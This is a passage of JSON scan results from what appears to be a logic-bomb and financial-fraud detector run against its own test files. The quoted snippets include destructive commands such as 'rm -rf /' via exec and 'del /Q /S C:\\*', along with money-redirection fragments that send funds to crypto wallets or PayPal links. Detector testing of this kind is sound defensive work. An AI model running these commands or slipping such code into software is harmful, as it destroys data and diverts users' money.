      "id": "889dce19-6217-4bd5-a240-57ba9f645b1e",
      "last_modified": "",
      "line_number": 93,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.238800"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "paypal_link = \"paypal.me/developer123\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.238800",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "25115bd1-600b-4341-b51d-ce739b94c188",
      "last_modified": "",
      "line_number": 114,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.238800"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Secret transfer to crypto wallet.\"\"\"",
      "column": 31,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.238800",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "3060ca01-257e-4e2d-8d7d-1abeb54eb635",
      "last_modified": "",
      "line_number": 119,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.238800"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "bitcoin_address = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.238800",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "048fb828-8f8a-4a1d-acd7-013256fa075b",
      "last_modified": "",
      "line_number": 120,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.238800"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_money(slush_fund_total, my_personal_account)",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.239797",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "95886a11-cf9c-4ebb-8bab-982886631468",
      "last_modified": "",
      "line_number": 162,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.239797"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Send amount to developer's crypto wallet.\"\"\"",
      "column": 39,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.239797",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "52efabcd-87b9-4da4-849a-94e8c48e5651",
      "last_modified": "",
      "line_number": 201,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.239797"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "self.crypto_transfer(amount, selected_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.239797",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "9a18fae1-02d5-4b31-b03d-52674b728db7",
      "last_modified": "",
      "line_number": 215,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.239797"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def crypto_transfer(self, amount, wallet_address):",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.240794",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "f145f2d1-053b-432c-a76b-fde044f3e7bb",
      "last_modified": "",
      "line_number": 217,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.240794"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Transfer to cryptocurrency wallet.\"\"\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.240794",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "dbe5bece-181c-4137-8602-c5073a6fc4dd",
      "last_modified": "",
      "line_number": 218,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.240794"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "shutil.rmtree('/important_folder')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.247808",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "82853190-428a-4412-bf49-fe4f47b92d1d",
      "last_modified": "",
      "line_number": 8,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.247808"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.system('del /Q /S C:\\\\*')",
      "column": 8,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.248797",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "2ac2ef82-e4c6-4c34-ba94-7816ec93fe14",
      "last_modified": "",
      "line_number": 9,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.248797"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "exec(\"__import__('os').system('rm -rf /')\")",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.248797",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "06347d1e-9191-40a6-9796-c7442c6af17f",
      "last_modified": "",
      "line_number": 12,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Code execution - System compromise risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.248797"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/critical.txt')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.248797",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "0e696417-c87c-4603-b991-f2297078a356",
      "last_modified": "",
      "line_number": 16,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.248797"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# Redirect payment to developer account",
      "column": 11,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.250810",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "0f0e1023-4bc1-40e3-9448-02405fb7f495",
      "last_modified": "",
      "line_number": 10,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.250810"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "crypto_wallet = \"0x742d35Cc6634C0532925a3b8D40F4174e3A59339\"",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.251794",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "a68b40a8-1ccf-4280-818a-5b8cb795af31",
      "last_modified": "",
      "line_number": 22,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.251794"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_crypto(fee * 0.01, crypto_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.251794",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "6c584706-961f-4ad2-9588-cbc5b35043f4",
      "last_modified": "",
      "line_number": 23,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.251794"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "paypal_link = \"paypal.me/developer123\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.252791",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "8e410117-1c38-4640-a51e-3e9b92b0e744",
      "last_modified": "",
      "line_number": 27,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.252791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "redirect_payment(amount * 0.001, paypal_link)",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.252791",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "fb827451-6986-492b-ada7-c6b9111baccd",
      "last_modified": "",
      "line_number": 28,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.252791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def transfer_crypto(amount, wallet):",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.252791",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "b570ecb1-d2f5-445d-9f0e-3c7c1e51ab12",
      "last_modified": "",
      "line_number": 41,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.252791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Transfer to crypto wallet.\"\"\"",
      "column": 20,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.253795",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "508f49ee-516e-401f-b095-c69f8bc2e179",
      "last_modified": "",
      "line_number": 42,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.253795"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def redirect_payment(amount, paypal):",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.253795",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "ed09fa56-d7d3-4a20-89f4-6decfc05491b",
      "last_modified": "",
      "line_number": 45,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.253795"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "exec(\"transfer_money(100, 'hidden_account')\")",
      "column": 7,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.253795",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "385f16dd-6074-48fc-8f47-9fe6330fe646",
      "last_modified": "",
      "line_number": 54,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Code execution - System compromise risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.253795"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# PATTERN 8: Hardcoded Bitcoin address",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.254796",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "49046960-103b-47c7-a7fc-d99550ae58c9",
      "last_modified": "",
      "line_number": 56,
